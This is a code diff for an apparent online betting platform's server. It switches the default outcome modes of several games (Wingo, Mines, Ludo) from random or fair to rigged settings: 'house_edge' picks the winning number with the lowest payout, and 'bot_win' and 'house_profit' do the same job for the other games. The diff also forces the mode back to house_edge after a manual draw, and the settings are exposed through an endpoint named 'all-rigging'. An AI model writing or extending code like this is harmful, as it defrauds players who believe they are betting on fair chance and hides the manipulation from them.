@@ -175,11 +175,11 @@ async function drawServerRound() {
     try {
         const periodToDraw = currentPeriod;
 
-        // 1. Fetch Admin Mode
+        // 1. Fetch Admin Mode (Default: house_edge - Smart House Profit Max)
         const modeSetting = await DB.get('SELECT value FROM settings WHERE key = ?', ['game_mode']);
         const manualSetting = await DB.get('SELECT value FROM settings WHERE key = ?', ['manual_number']);
 
-        const mode = modeSetting ? modeSetting.value : 'random';
+        const mode = (modeSetting && modeSetting.value) ? modeSetting.value : 'house_edge';
         let winningNum = Math.floor(Math.random() * 10);
 
         // Fetch all bets on this period
@@ -187,8 +187,9 @@ async function drawServerRound() {
 
         if (mode === 'manual' && manualSetting && manualSetting.value !== '') {
             winningNum = parseInt(manualSetting.value);
-            // Reset manual after drawing
+            // Reset manual after drawing and revert back to house_edge (Max Profit default)
             await DB.run('UPDATE settings SET value = ? WHERE key = ?', ['', 'manual_number']);
+            await DB.run('UPDATE settings SET value = ? WHERE key = ?', ['house_edge', 'game_mode']);
         } else if (mode === 'house_edge' && periodBets.length > 0) {
             // Smart House Edge: Find the number 0-9 that pays out the minimum
             let lowestPayout = Infinity;
@@ -956,15 +957,15 @@ app.get('/api/admin/overview', requireAdmin, async (req, res) => {
             currentPeriod,
             remainingSeconds,
             isLocked,
-            gameMode: modeSetting ? modeSetting.value : 'random',
+            gameMode: (modeSetting && modeSetting.value) ? modeSetting.value : 'house_edge',
             manualNumber: manualSetting ? manualSetting.value : '',
             aviatorMode: (DB.data.settings && DB.data.settings.aviator_mode) || 'smart_profit',
             aviatorCrash: (DB.data.settings && DB.data.settings.aviator_crash) || '2.00',
-            minesMode: (DB.data.settings && DB.data.settings.mines_mode) || 'random',
+            minesMode: (DB.data.settings && DB.data.settings.mines_mode) || 'house_profit',
             minesMaxSafe: (DB.data.settings && DB.data.settings.mines_max_safe) || '1',
             k3Mode: (DB.data.settings && DB.data.settings.k3_mode) || 'random',
             k3Dice: (DB.data.settings && DB.data.settings.k3_dice) || '1,2,3',
-            ludoMode: (DB.data.settings && DB.data.settings.ludo_mode) || 'fair',
+            ludoMode: (DB.data.settings && DB.data.settings.ludo_mode) || 'bot_win',
             stats: {
                 users: totalUsers.count,
                 totalBalance: Math.floor((totalBalance.total || 0) * 100) / 100,
@@ -984,16 +985,16 @@ app.get('/api/game/all-rigging', async (req, res) => {
         const s = DB.data.settings || {};
         res.json({
             success: true,
-            wingo_mode: s.game_mode || 'random',
+            wingo_mode: s.game_mode || 'house_edge',
             wingo_manual_number: s.manual_number !== undefined ? String(s.manual_number) : '',
             aviator_mode: s.aviator_mode || 'smart_profit',
             aviator_crash: parseFloat(s.aviator_crash || '2.00'),
             aviator_force_ts: parseInt(s.aviator_force_ts || '0'),
-            mines_mode: s.mines_mode || 'random',
+            mines_mode: s.mines_mode || 'house_profit',
             mines_max_safe: parseInt(s.mines_max_safe || '1'),
             k3_mode: s.k3_mode || 'random',
             k3_dice: s.k3_dice || '1,2,3',
-            ludo_mode: s.ludo_mode || 'fair'
+            ludo_mode: s.ludo_mode || 'bot_win'
         });
     } catch (e) {
         res.status(500).json({ success: false, message: e.message });
